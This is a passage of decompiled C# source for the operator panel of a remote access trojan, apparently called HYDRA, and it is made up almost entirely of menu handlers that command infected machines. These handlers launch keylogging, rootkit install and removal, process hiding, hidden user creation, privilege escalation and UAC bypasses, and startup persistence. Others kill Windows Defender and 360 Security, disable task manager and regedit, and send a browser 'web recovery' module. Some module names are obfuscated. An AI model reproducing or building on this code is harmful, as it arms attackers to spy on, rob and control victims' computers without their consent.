						{
							Name = "Remote File :" + address
						});
					}
					catch
					{
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			catch
			{
			}
		}

		private async void installToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateHRDPPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("HDPRLogin"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void removeToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateHRDPPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Remove"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void hideProcessToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateHRDPPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("HideProc"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void createUserToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateHRDPPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("AddUser"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void updateCompabilityToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateHRDPPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("UpdateComp"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void loginInfoToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private async void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("Remote Desktop.dll", "Initializing Task [Remote Desktop] module, please wait..."));
			try
			{
				if (!this.GetSelectedSession(out var tcs))
				{
					return;
				}
				string address = tcs._remoteEndPoint.Address.ToString();
				if ((Remote_Desk)Application.OpenForms["Remote Desktop"] != null)
				{
					return;
				}
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						Application.Run(new Remote_Desk("\\\\" + address + " - [Remote Desktop Manager]", tcs)
						{
							Name = "Remote Desktop"
						});
					}
					catch
					{
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			catch
			{
			}
		}

		private async void qq360HVNCToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private async void sogouHVNCToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private async void remoteHVNCToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private async void remoteKeyboardToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("Remote Keyboard.dll", "Initializing Task [Keylogger] module, please wait..."));
			Task.Delay(4000).Wait();
			try
			{
				if (!this.GetSelectedSession(out var tcs))
				{
					return;
				}
				string address = tcs._remoteEndPoint.Address.ToString();
				if ((Remote_Keylogger)Application.OpenForms["Remote Keyboard :" + address] != null)
				{
					return;
				}
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						Application.Run(new Remote_Keylogger("\\\\" + address + " - Remote Keyboard Manager(Keylogging is on)", tcs)
						{
							Name = "Remote Keyboard :" + address
						});
					}
					catch
					{
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			catch
			{
			}
		}

		private async void privilegeEscalationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("Remote PrivilegeEscalation.dll", "Initializing Task [Privilege Escalation] module, please wait..."));
			try
			{
				if (!this.GetSelectedSession(out var tcs))
				{
					return;
				}
				string address = tcs._remoteEndPoint.Address.ToString();
				if ((Privilege_Escalation)Application.OpenForms["Remote Privilege_Escalation" + address] != null)
				{
					return;
				}
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						Application.Run(new Privilege_Escalation("\\\\" + address + " - [ Remote Privilege_Escalation ]", tcs)
						{
							Name = "Remote Privilege_Escalation" + address
						});
					}
					catch
					{
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			catch
			{
			}
		}

		private async void windows10ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateUACPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Windows10"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void windows8ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateUACPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Windows8"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void windows7ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateUACPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Windows7"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void adminpermissionsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateOtherPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			try
			{
				((sender as ToolStripMenuItem).Owner as ContextMenuStrip).Visible = false;
				if (this.GetSelectedSession(out var tcs))
				{
					tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("admin"));
				}
			}
			catch
			{
			}
		}

		private async void remoteStartupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("Remote Startup.dll", "Initializing Task [Startup Manager] module, please wait..."));
			Task.Delay(4000).Wait();
			try
			{
				if (!this.GetSelectedSession(out var tcs))
				{
					return;
				}
				string address = tcs._remoteEndPoint.Address.ToString();
				if ((Remote_Startup)Application.OpenForms["Remote AddStartup :" + address] != null)
				{
					return;
				}
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						Application.Run(new Remote_Startup("\\\\" + address + " - Remote Startup Manager", tcs)
						{
							Name = "Remote Startup :" + address
						});
					}
					catch
					{
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			catch
			{
			}
		}

		private async void PortproxyToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private async void killWDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			try
			{
				Thread.Sleep(3000);
				try
				{
					if (this.GetSelectedSession(out var tcs))
					{
						tcs.Client_Send(DataType.RemoteHydraType, Encoding.UTF8.GetBytes("stopwd"));
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		private void close360ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string dll = Application.StartupPath + "\\Plugin\\Remote360Sec.key";
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						_ = (sender as ToolStripMenuItem).Owner;
						if (this.GetSelectedSession(out var tcs))
						{
							int num = Encoding.UTF8.GetBytes("close360:").Length;
							byte[] array = GZip.Compress(File.ReadAllBytes(dll));
							byte[] array2 = new byte[num + array.Length];
							Buffer.BlockCopy(Encoding.UTF8.GetBytes("close360:"), 0, array2, 0, num);
							Buffer.BlockCopy(array, 0, array2, num, array.Length);
							tcs.Client_Send(DataType.RemoteOtherType, array2);
						}
					}
					catch (Exception)
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void AddstartupitemToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				this.DoLoadGui(HYDRAUI.reupload("PONXk~Kzz$Zf\u007fmcdy$AcffHcff$aos"), HYDRAUI.reupload("_zfekncdm*QAcffHcffW*gen\u007ffo&*zfokyo*}kc~$$$"));
				Thread.Sleep(3000);
				try
				{
					this.guna2ContextMenuStrip1.Visible = false;
					if (this.GetSelectedSession(out var tcs))
					{
						tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("AddEx"));
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		private async void taskstartitemToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				this.DoLoadGui(HYDRAUI.reupload("PONXk~Kzz$Zf\u007fmcdy$AcffHcff$aos"), HYDRAUI.reupload("_zfekncdm*QAcffHcffW*gen\u007ffo&*zfokyo*}kc~$$$"));
				Thread.Sleep(3000);
				try
				{
					this.guna2ContextMenuStrip1.Visible = false;
					if (this.GetSelectedSession(out var tcs))
					{
						tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Task"));
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		private async void installToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateRootKitPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("RootIn"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.activateRootKitPluginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("RootUn"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void onToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("EnableMonitor"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void offToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("DisableMonitor"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void openToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("EjectCD"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void closeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("CloseCD"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void showToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("ShowTaskbar"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void hideToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("HideTaskbar"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void showToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("ShowStartBtn"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void hideToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("HideStartBtn"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void startToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("StartExplorer"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void stopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("StopExplorer"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void showToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("ShowClock"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void hideToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("HideClock"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void showToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("showtray"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void hideToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("hidetray"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void toolStripMenuItem1_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("showdesktopico"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void toolStripMenuItem2_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("hidedesktopico"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void restoreToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("hideallwindows"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void hideToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("hideallwindows"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void enableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("enabletaskmgr"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void disableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("disabletaskmgr"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void enableToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("enableregedit"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void disableToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("disableregedit"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void toolStripMenuItem3_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("showmouse"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void toolStripMenuItem4_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("hidemouse"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void toolStripMenuItem5_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("enableuac"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void toolStripMenuItem6_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("disableuac"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void webRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.DoLoadGui(HYDRAUI.reupload("DoedXk~$Zf\u007fmcdy$Xoge~oE~box$aos"), HYDRAUI.reupload("_zfekncdm*Q\\odeg*Zf\u007fmcdW*gen\u007ffo&*zfokyo*}kc~$$$"));
			try
			{
				using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(HYDRAUI.reupload("DoedXk~$Zf\u007fmcdy$Xoge~o]oh$aos"));
				byte[] buffer = new byte[stream.Length];
				stream.Read(buffer, 0, buffer.Length);
				Thread.Sleep(3000);
				try
				{
					if (!this.GetSelectedSession(out var tcs))
					{
						return;
					}
					string obj = tcs._remoteEndPoint.Address.ToString();
					if ((Remote_Shell)Application.OpenForms["Remote Web Recovery :" + obj] != null)
					{
						return;
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							int num = 15000;
							byte[] array = GZip.Compress(buffer);
							int num2 = array.Length / num;
							num2 = ((array.Length % num > 0) ? (num2 + 1) : num2);
							for (int i = 0; i < num2; i++)
							{
								string s = "web_recovery:" + ((i + 1 < 10) ? ("0" + (i + 1) + "/" + num2 + ":") : (i + 1 + "/" + num2 + ":"));
								int num3 = Encoding.UTF8.GetBytes(s).Length;
								byte[] array2 = null;
								int num4 = 0;
								num4 = ((array.Length - i * num < num) ? (array.Length - i * num) : num);
								array2 = new byte[num3 + num4];
								Buffer.BlockCopy(Encoding.UTF8.GetBytes(s), 0, array2, 0, num3);
								Buffer.BlockCopy(array, i * num, array2, num3, num4);
								tcs.Client_Send(DataType.RemoteOtherType, array2);
								Thread.Sleep(10);
							}
						}
						catch
						{
						}
					});
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

